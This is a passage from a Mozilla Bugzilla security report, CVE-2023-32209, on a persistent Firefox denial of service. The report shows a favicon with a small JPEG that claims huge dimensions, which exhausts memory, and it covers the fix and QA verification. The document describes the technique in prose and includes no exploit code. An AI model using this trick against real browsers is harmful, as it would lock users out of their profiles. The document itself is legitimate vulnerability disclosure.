In other places we have used SurfaceCache::CanHold to put some finite limit on memory used while decoding (ie <https://searchfox.org/mozilla-central/rev/b4150d1c6fae0c51c522df2d2c939cf5ad331d4c/image/SurfaceFilters.h#232> ). This value is like about 2GB iirc. Much larger than the 100mb you have, but having any reasonable finite limit should be enough to avoid problems here.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a15920638_1689)• 2 years ago |

[Attachment #9276912](/attachment.cgi?id=9276912&action=edit "A single, self-contained html file to reproduce the crash in Firefox") -
Attachment mime type: application/octet-stream → text/html

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a15921354_1689)• 2 years ago |

See Also: → [1277397](/show_bug.cgi?id=1277397 "RESOLVED FIXED - High memory usage triggered by a jpg"), [1252200](/show_bug.cgi?id=1252200 "NEW - libjpeg-turbo: DoS via small Image with large Dimensions"), [1462008](/show_bug.cgi?id=1462008 "NEW - Small jpeg triggers runaway memory usage in Firefox 59 -> Nightly")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1767194#c21)• 2 years ago |
|  | |

(In reply to Timothy Nikkel (:tnikkel) from [comment #20](/show_bug.cgi?id=1767194#c20 "VERIFIED FIXED - persistent browser DoS via favicon containing a small JPEG images that list their image dimensions as large"))

> Probably the issue is already filed as one of [bug 1277397](/show_bug.cgi?id=1277397 "RESOLVED FIXED - High memory usage triggered by a jpg"), [bug 1252200](/show_bug.cgi?id=1252200 "NEW - libjpeg-turbo: DoS via small Image with large Dimensions"), [bug 1462008](/show_bug.cgi?id=1462008 "NEW - Small jpeg triggers runaway memory usage in Firefox 59 -> Nightly").

True, those look similar and might be the same underlying "bug". But the trick of DoSing the parent by making it a favicon makes the impact worse. The favicon gets into your history so even when you restart you get DoS'd all over again every time the awesomebar brings up that match. If your machine has gobs of memory like mine and doesn't crash maybe you can eventually delete it out of history, but if you crash because not enough memory it's going to be stuck there until you create a new profile.

Depends on: [1277397](/show_bug.cgi?id=1277397 "RESOLVED FIXED - High memory usage triggered by a jpg")Flags: sec-bounty? → sec-bounty+Summary: Denial of Service when loading small JPEG images that list their image dimensions as large → persistent browser DoS via favicon containing a small JPEG images that list their image dimensions as large

|  | [Timothy Nikkel (:tnikkel)](/user_profile?user_id=255010)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a26737366_255010)• 2 years ago |

Assignee: nobody → tnikkel

|  | [Timothy Nikkel (:tnikkel)](/user_profile?user_id=255010)  Assignee |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1767194#c22)• 2 years ago |
|  | |

I posted a patch in [bug 1277397](/show_bug.cgi?id=1277397 "RESOLVED FIXED - High memory usage triggered by a jpg") since I don't think the patch needs to be in a sec bug.

|  | [Timothy Nikkel (:tnikkel)](/user_profile?user_id=255010)  Assignee |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1767194#c23)• 2 years ago |
|  | |

This should be fixed by [bug 1277397](/show_bug.cgi?id=1277397 "RESOLVED FIXED - High memory usage triggered by a jpg") now.

Status: NEW → RESOLVEDClosed: 2 years agoResolution: --- → FIXED

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a28458208_75935)• 2 years ago |

Group: gfx-core-security → core-security-release
[status-firefox111](/buglist.cgi?f1=cf_status_firefox111&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=wontfix)
[status-firefox112](/buglist.cgi?f1=cf_status_firefox112&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=wontfix)
[status-firefox113](/buglist.cgi?f1=cf_status_firefox113&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=fixed)
[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=wontfix)Target Milestone: --- → 113 Branch

|  | [Mihai Boldan, Desktop QA [:mboldan]](/user_profile?user_id=551058) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a29980669_551058)• 2 years ago |

Flags: qe-verify+

|  | [Tyson Smith [:tsmith]](/user_profile?user_id=486634) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a31570446_486634)• 2 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?] → [reporter-external] [client-bounty-form] [verif?][adv-main113+]

|  | [Brindusa Tot, Desktop QA](/user_profile?user_id=553429) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a31626026_553429)• 2 years ago |

QA Whiteboard: [post-critsmash-triage]

|  | [Tyson Smith [:tsmith]](/user_profile?user_id=486634) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1767194#c24)• 2 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9331272)
— [Details](attachment.cgi?id=9331272&action=edit)

|  | [Negritas Sergiu, Desktop QA](/user_profile?user_id=643957) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1767194#c25)• 2 years ago |
|  | |

Hello I have managed to reproduce the issue with Firefox 101.0a1(2022-04-30) with the test case provided in [comment 17](/show_bug.cgi?id=1767194#c17 "VERIFIED FIXED - persistent browser DoS via favicon containing a small JPEG images that list their image dimensions as large") with Ubuntu 22.04. I can confirm that the issue is fixed with firefox 113.0 and 114.0a1(2023-05-03) on Ubuntu 22.04, MacOS 10.15 and Windows 10.

Status: RESOLVED → VERIFIED
[status-firefox113](/buglist.cgi?f1=cf_status_firefox113&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=verified)Flags: qe-verify+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a31807322_578488)• 2 years ago |

Alias: CVE-2023-32209

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a46191523_1689)• 1 year ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a65682334_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1767194&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [sam.z.ezeh](/user_profile?user_id=701580)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review


